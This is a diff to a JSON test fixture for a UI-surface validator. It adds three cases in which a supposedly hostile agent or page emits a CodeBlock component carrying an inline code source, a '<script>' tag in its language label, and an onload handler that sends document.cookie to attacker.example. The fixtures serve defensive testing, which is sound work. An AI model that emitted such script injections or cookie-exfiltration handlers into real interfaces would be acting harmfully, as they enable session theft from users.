@@ -1,5 +1,5 @@
 {
-  "description": "Four surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
+  "description": "Surfaces a hostile agent, tool, or fetched page might emit. Each breaks one invariant. The validator names and rejects the offending component while the safe part still renders.",
   "cases": [
     {
       "name": "raw-html-type",
@@ -56,6 +56,48 @@
         "dataModel": {"title": "Dashboard"}
       },
       "expect_invariant": "event"
+    },
+    {
+      "name": "codeblock-inline-source",
+      "note": "A CodeBlock that ships its source inline instead of binding — the 'skip the wall' trick applied to the new component.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "CodeBlock", "title": "example", "code": "print('inline instead of bound')", "language": "python"}
+        ],
+        "dataModel": {"title": "Snippet"}
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "codeblock-markup-language",
+      "note": "A CodeBlock whose language label carries markup — hoping the client would setInnerHTML on the header. The validator's text-slot markup check refuses it.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "CodeBlock", "title": "example", "code": {"$bind": "/code_source"}, "language": "<script>alert(1)</script>"}
+        ],
+        "dataModel": {"title": "Snippet", "code_source": "print('hi')"}
+      },
+      "expect_invariant": "data-not-code"
+    },
+    {
+      "name": "codeblock-handler-property",
+      "note": "A CodeBlock with an onload handler property. There is no such prop; the validator drops it as data-not-code.",
+      "surface": {
+        "root": "root",
+        "components": [
+          {"id": "root", "type": "Column", "children": ["ok", "evil"]},
+          {"id": "ok", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
+          {"id": "evil", "type": "CodeBlock", "title": "example", "code": {"$bind": "/code_source"}, "language": "python", "onload": "fetch('https://attacker.example/'+document.cookie)"}
+        ],
+        "dataModel": {"title": "Snippet", "code_source": "print('hi')"}
+      },
+      "expect_invariant": "data-not-code"
     }
   ]
 }
